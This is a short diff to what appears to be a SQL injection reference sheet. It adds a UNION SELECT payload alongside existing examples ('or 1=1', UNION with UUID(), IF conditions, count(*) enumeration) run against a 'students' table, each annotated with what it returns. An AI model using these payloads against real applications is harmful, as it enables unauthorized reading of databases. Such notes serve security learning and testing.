@@ -13,6 +13,8 @@ select * from students where Student_ID = 1 UNION select 1,1,1,1,UUID();  --> Wi
 
 select * from students where Student_ID = 1 UNION select 1,1,1,1,IF(5>2, 'passed', 'failed'); --> This will return the true condition block 'passed' as part of the retrieved SQL result
 
+select * from students where Student_Section = 'a' UNION select 1,2,3,4,5;--  --> Will show another row with 1,2,3,4,5 data
+
 select * from students where Student_ID = 1 or 1=1;  --> Will give all columns data from the selected table
 
 select * from students where Student_ID = 1 UNION select count(*) from <Table_Name>;  --> Will return the number of rows/records in the table
